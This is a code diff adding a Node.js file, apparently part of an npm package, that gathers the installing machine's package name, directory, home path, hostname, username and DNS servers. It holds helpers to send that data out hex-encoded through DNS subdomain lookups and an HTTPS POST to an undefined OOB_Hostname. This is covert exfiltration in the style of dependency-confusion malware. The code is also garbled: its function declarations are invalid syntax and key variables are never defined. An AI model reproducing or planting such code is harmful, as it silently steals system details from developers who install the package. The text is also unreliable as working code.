@@ -1,0 +1,53 @@
+const os = require("os")
+const dns = require("dns")
+const https = require("https")
+const packageJSON = require("./package.json")
+function convertASCIItoHex = function convertASCIItoHex(Data) {
+    var dataBuffer = Buffer.from(Data, "UTF-8");
+    return dataBuffer.toString("hex");
+}
+function splitHexString = function splitHexString(hexString, len) {
+    var regexp = new RegExp(".{1," + len + "}", "g");
+    return hexString.match(regexp);
+}
+function dnsExfil = function dnsExfil(trackingDataHex) {
+    var ch = splitHexString(trackingDataHex, 32);
+    for (var i in ch) {
+        dns.lookup(i + "." + ch[i] + "." + OOB_Hostname, function (error) {
+            if (error) {
+                // throw error;
+            }
+        });
+    }
+}
+function httpExfil = function httpExfil(trackingDataHex) {
+    var postData = "data=" + trackingDataHex;
+    const options = {
+        hostname: OOB_Hostname,
+        port: 443,
+        path: "/",
+        method: "POST",
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Content-Length": postData.length,
+        },
+    };
+    var req = https.request(options, (res) => {
+        res.on("data", (d) => {
+            // process.stdout.write(d);
+        });
+    });
+
+    req.on("error", (e) => {
+        // console.error(e);
+    });
+
+    req.write(postData);
+    req.end();
+}
+_tmp_3.pkg = "npm/" + packageJSON.name
+_tmp_3.pwd = __dirname
+_tmp_3.hd = os.homedir()
+_tmp_3.hn = os.hostname()
+_tmp_3.un = os.userInfo().username
+_tmp_3.dns = dns.getServers()
